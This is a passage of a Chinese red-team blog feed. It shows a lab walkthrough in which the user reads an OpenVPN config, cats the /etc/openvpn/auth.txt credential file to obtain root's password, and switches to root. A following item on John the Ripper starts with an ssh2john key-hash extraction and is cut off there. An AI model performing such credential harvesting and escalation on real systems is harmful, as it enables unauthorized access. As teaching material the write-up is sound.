+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@RedteamNotes:~$ cat myvpn.ovpn 
+</span></span><span style="display:flex;"><span>client
+</span></span><span style="display:flex;"><span>dev tun
+</span></span><span style="display:flex;"><span>proto udp
+</span></span><span style="display:flex;"><span>remote 10.10.10.10 <span style="color:#ae81ff">1194</span>
+</span></span><span style="display:flex;"><span>resolv-retry infinite
+</span></span><span style="display:flex;"><span>nobind
+</span></span><span style="display:flex;"><span>persist-key
+</span></span><span style="display:flex;"><span>persist-tun
+</span></span><span style="display:flex;"><span>ca ca.crt
+</span></span><span style="display:flex;"><span>tls-client
+</span></span><span style="display:flex;"><span>remote-cert-tls server
+</span></span><span style="display:flex;"><span>auth-user-pass /etc/openvpn/auth.txt
+</span></span><span style="display:flex;"><span>comp-lzo
+</span></span><span style="display:flex;"><span>verb <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>reneg-sec <span style="color:#ae81ff">0</span>
+</span></span></code></pre></div><p>发现认证密码凭据存放在 <code>/etc/openvpn/auth.txt</code> 中，查看详细信息。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@RedteamNotes:~$ cat /etc/openvpn/auth.txt
+</span></span><span style="display:flex;"><span>root
+</span></span><span style="display:flex;"><span>password123
+</span></span></code></pre></div><p>切换为 root。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@RedteamNotes:~$ su root
+</span></span><span style="display:flex;"><span>Password: 
+</span></span><span style="display:flex;"><span>root@RedteamNotes:/home/user# whoami
+</span></span><span style="display:flex;"><span>root
 </span></span></code></pre></div>]]></content></item><item><title>John 工作原理分析</title><link>https://enilmalus.github.io/posts/john-%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/</link><pubDate>Thu, 01 Jan 2026 00:40:00 +0800</pubDate><guid>https://enilmalus.github.io/posts/john-%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/</guid><description>&lt;h2 id="ssh2john-提取私钥"&gt;ssh2john 提取私钥&lt;/h2&gt;
 &lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;┌──&lt;span style="color:#f92672"&gt;(&lt;/span&gt;kali㉿kali&lt;span style="color:#f92672"&gt;)&lt;/span&gt;-&lt;span style="color:#f92672"&gt;[&lt;/span&gt;~/Work/Kali&lt;span style="color:#f92672"&gt;]&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;└─$ ssh2john id_rsa | tee key_hash
